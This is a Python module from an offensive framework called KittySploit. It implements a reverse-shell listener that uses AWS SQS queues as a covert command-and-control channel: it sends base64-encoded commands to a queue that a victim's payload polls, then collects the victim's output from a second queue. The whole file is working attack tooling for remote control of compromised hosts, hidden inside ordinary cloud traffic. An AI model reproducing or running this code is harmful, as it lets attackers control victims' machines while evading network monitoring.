#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
AWS SQS Reverse Shell Listener
Author: KittySploit Team
Version: 1.0.0

This listener uses AWS SQS (Simple Queue Service) to establish a reverse shell connection.
It requires two SQS queues:
- Command Queue: Where commands are sent to the victim
- Response Queue: Where responses are received from the victim

Setup:
1. Create two SQS queues in AWS
2. Configure AWS credentials (via AWS CLI, environment variables, or IAM role)
3. Set the queue URLs in the listener options
4. The victim must have a payload that polls the command queue and sends responses to the response queue
"""

from kittysploit import *
import threading
import time
import json
import base64
from typing import Optional, Dict, Any

try:
    import boto3
    from botocore.exceptions import ClientError, BotoCoreError
    BOTO3_AVAILABLE = True
except ImportError:
    BOTO3_AVAILABLE = False

class Module(Listener):
    """AWS SQS Reverse Shell Listener"""
    
    __info__ = {
        "name": "reverse aws sqs",
        "description": "Reverse shell listener using AWS SQS (Simple Queue Service)",
        "author": "KittySploit Team",
        "version": "1.0.0",
        "handler": Handler.REVERSE,
        "session_type": SessionType.AWS,
        "dependencies": ["boto3"],
    }
    
    # AWS Configuration
    aws_region = OptString("us-east-1", "AWS Region (e.g., us-east-1, eu-west-1)", False)
    command_queue_url = OptString("", "SQS Queue URL for sending commands to victim (REQUIRED)", True)
    response_queue_url = OptString("", "SQS Queue URL for receiving responses from victim (REQUIRED)", True)
    aws_access_key_id = OptString("", "AWS Access Key ID (optional, uses default credentials if empty)", False)
    aws_secret_access_key = OptString("", "AWS Secret Access Key (optional, uses default credentials if empty)", False)
    aws_session_token = OptString("", "AWS Session Token (optional, for temporary credentials)", False)
    
    # Polling Configuration
    poll_interval = OptInteger(2, "Polling interval in seconds (how often to check for responses)", False)
    visibility_timeout = OptInteger(30, "SQS Visibility Timeout in seconds", False)
    max_messages = OptInteger(1, "Maximum messages to receive per poll (1-10)", False)
    
    # Message Configuration
    use_base64 = OptBool(True, "Encode/decode messages in Base64", False)
    message_attributes = OptBool(True, "Use message attributes for metadata", False)
    
    def _init_aws_client(self):
        """Initialize AWS SQS client"""
        if not BOTO3_AVAILABLE:
            print_error("boto3 library not installed. Install with: pip install boto3")
            return False
        
        try:
            # Prepare client configuration
            client_config = {
                'region_name': str(self.aws_region.value)
            }
            
            # Use credentials if provided, otherwise use default credentials
            if self.aws_access_key_id.value and self.aws_secret_access_key.value:
                client_config['aws_access_key_id'] = str(self.aws_access_key_id.value)
                client_config['aws_secret_access_key'] = str(self.aws_secret_access_key.value)
                if self.aws_session_token.value:
                    client_config['aws_session_token'] = str(self.aws_session_token.value)
            
            # Create SQS client
            self.sqs_client = boto3.client('sqs', **client_config)
            
            # Test connection by getting queue attributes
            try:
                self.sqs_client.get_queue_attributes(
                    QueueUrl=str(self.command_queue_url.value),
                    AttributeNames=['QueueArn']
                )
                print_success("AWS SQS client initialized successfully")
                return True
            except ClientError as e:
                error_code = e.response.get('Error', {}).get('Code', 'Unknown')
                if error_code == 'AWS.SimpleQueueService.NonExistentQueue':
                    print_error(f"Command queue not found: {self.command_queue_url.value}")
                else:
                    print_error(f"AWS error: {e}")
                return False
                
        except Exception as e:
            print_error(f"Failed to initialize AWS SQS client: {e}")
            return False
    
    def run(self):
        """Run the AWS SQS listener"""
        try:
            # Validate configuration
            if not self.command_queue_url.value or not self.response_queue_url.value:
                print_error("Both command_queue_url and response_queue_url must be set")
                return False
            
            # Initialize AWS client
            if not self._init_aws_client():
                return False
            
            print_status("Starting AWS SQS reverse shell listener...")
            print_info(f"Command Queue: {self.command_queue_url.value}")
            print_info(f"Response Queue: {self.response_queue_url.value}")
            print_info(f"Region: {self.aws_region.value}")
            print_info(f"Poll Interval: {self.poll_interval.value}s")
            print_info("Waiting for victim to connect...")
            
            # Create a connection object (dictionary with AWS SQS info)
            connection_data = {
                'sqs_client': self.sqs_client,
                'command_queue_url': str(self.command_queue_url.value),
                'response_queue_url': str(self.response_queue_url.value),
                'region': str(self.aws_region.value),
                'poll_interval': int(self.poll_interval.value),
                'visibility_timeout': int(self.visibility_timeout.value),
                'max_messages': int(self.max_messages.value),
                'use_base64': bool(self.use_base64.value),
                'message_attributes': bool(self.message_attributes.value),
                'listener_id': self.listener_id
            }
            
            # Create session with connection data
            # Use a dummy host/port since we're using AWS SQS
            target = f"aws-sqs-{self.aws_region.value}"
            port = 0  # No port for SQS
            
            # Prepare session data
            session_data = {
                'protocol': 'aws_sqs',
                'aws_region': str(self.aws_region.value),
                'command_queue_url': str(self.command_queue_url.value),
                'response_queue_url': str(self.response_queue_url.value),
                'connection_type': 'aws_sqs',
                'connection_time': time.time(),
                'listener_type': 'reverse_aws_sqs',
                'handler': 'reverse',
                'session_type': 'aws'
            }
            
            # Create session using _create_session method
            session_id = self._create_session(
                'reverse',
                target,
                port,
                session_data
            )
            
            # Store connection data in listener for shell access
            if session_id:
                conn_id = f"{target}:{port}"
                self.connections[conn_id] = connection_data
                self._session_connections[session_id] = connection_data
                self.stats['connections_received'] += 1
                
                self.session_id = session_id
                print_success(f"Session {session_id} created")
                print_info("Session is ready. You can now use 'sessions -i {session_id}' to interact with it")
                print_info("Or use post modules with 'set session_id {session_id}'")
                
                # Start polling thread to receive responses
                self.running = True
                self.polling_thread = threading.Thread(target=self._poll_responses, daemon=True)
                self.polling_thread.start()
                
                return session_id
            else:
                print_error("Failed to create session")
                return False
                
        except Exception as e:
            print_error(f"Error starting listener: {e}")
            import traceback
            traceback.print_exc()
            return False
    
    def _poll_responses(self):
        """Poll SQS response queue for messages from victim"""
        try:
            if not hasattr(self, 'running'):
                self.running = True
            while self.running:
                try:
                    # Receive messages from response queue
                    response = self.sqs_client.receive_message(
                        QueueUrl=str(self.response_queue_url.value),
                        MaxNumberOfMessages=min(int(self.max_messages.value), 10),
                        WaitTimeSeconds=1,  # Short polling
                        VisibilityTimeout=int(self.visibility_timeout.value),
                        MessageAttributeNames=['All'] if self.message_attributes.value else []
                    )
                    
                    messages = response.get('Messages', [])
                    
                    if messages:
                        for message in messages:
                            try:
                                # Process message
                                body = message.get('Body', '')
                                receipt_handle = message.get('ReceiptHandle')
                                
                                # Decode if base64
                                if self.use_base64.value:
                                    try:
                                        body = base64.b64decode(body).decode('utf-8')
                                    except:
                                        pass
                                
                                # Parse JSON if possible
                                try:
                                    data = json.loads(body)
                                    command_id = data.get('command_id', 'unknown')
                                    output = data.get('output', body)
                                    status = data.get('status', 0)
                                    error = data.get('error', '')
                                except:
                                    # Not JSON, use raw body
                                    output = body
                                    status = 0
                                    error = ''
                                    command_id = 'unknown'
                                
                                # Update last response time
                                self.last_response_time = time.time()
                                
                                # Store response in session if available
                                if self.session_id and self.framework:
                                    # Try to get shell and update it with response
                                    if hasattr(self.framework, 'shell_manager'):
                                        shell = self.framework.shell_manager.get_shell(self.session_id)
                                        if shell and hasattr(shell, '_store_response'):
                                            shell._store_response(command_id, output, status, error)
                                
                                # Delete message after processing
                                if receipt_handle:
                                    self.sqs_client.delete_message(
                                        QueueUrl=str(self.response_queue_url.value),
                                        ReceiptHandle=receipt_handle
                                    )
                                
                                # Print response
                                if output:
                                    print_info(f"[Response] {output}")
                                if error:
                                    print_error(f"[Error] {error}")
                                    
                            except Exception as e:
                                print_error(f"Error processing message: {e}")
                                continue
                    
                    # Sleep before next poll
                    time.sleep(int(self.poll_interval.value))
                    
                except ClientError as e:
                    error_code = e.response.get('Error', {}).get('Code', 'Unknown')
                    if error_code == 'AWS.SimpleQueueService.NonExistentQueue':
                        print_error("Response queue not found. Stopping polling.")
                        break
                    else:
                        print_error(f"AWS error while polling: {e}")
                        time.sleep(5)  # Wait before retrying
                except Exception as e:
                    if self.running:
                        print_error(f"Error polling responses: {e}")
                    time.sleep(5)
                    
        except Exception as e:
            print_error(f"Polling thread error: {e}")
    
    def send_command(self, command: str) -> bool:
        """Send a command to the victim via SQS"""
        try:
            if not self.sqs_client:
                print_error("AWS SQS client not initialized")
                return False
            
            # Initialize command_counter if not exists
            if not hasattr(self, 'command_counter'):
                self.command_counter = 0
            if not hasattr(self, 'pending_commands'):
                self.pending_commands = {}
            
            # Generate command ID
            self.command_counter += 1
            command_id = f"cmd_{self.command_counter}_{int(time.time())}"
            
            # Prepare message
            message_data = {
                'command_id': command_id,
                'command': command,
                'timestamp': time.time()
            }
            
            message_body = json.dumps(message_data)
            
            # Encode if base64
            if self.use_base64.value:
                message_body = base64.b64encode(message_body.encode('utf-8')).decode('utf-8')
            
            # Prepare message attributes if enabled
            message_attributes = {}
            if self.message_attributes.value:
                message_attributes = {
                    'CommandID': {
                        'StringValue': command_id,
                        'DataType': 'String'
                    },
                    'Timestamp': {
                        'StringValue': str(time.time()),
                        'DataType': 'Number'
                    }
                }
            
            # Send message
            response = self.sqs_client.send_message(
                QueueUrl=str(self.command_queue_url.value),
                MessageBody=message_body,
                MessageAttributes=message_attributes if message_attributes else None
            )
            
            # Store pending command
            self.pending_commands[command_id] = {
                'command': command,
                'timestamp': time.time(),
                'message_id': response.get('MessageId')
            }
            
            print_info(f"Command sent: {command} (ID: {command_id})")
            return True
            
        except ClientError as e:
            print_error(f"AWS error sending command: {e}")
            return False
        except Exception as e:
            print_error(f"Error sending command: {e}")
            return False
    
    def stop(self):
        """Stop the listener"""
        print_info("Stopping AWS SQS listener...")
        self.running = False
        
        # Wait for polling thread
        if self.polling_thread and self.polling_thread.is_alive():
            self.polling_thread.join(timeout=5)
        
        print_success("AWS SQS listener stopped")
        return True
    
    def shutdown(self):
        """Shutdown the listener"""
        return self.stop()

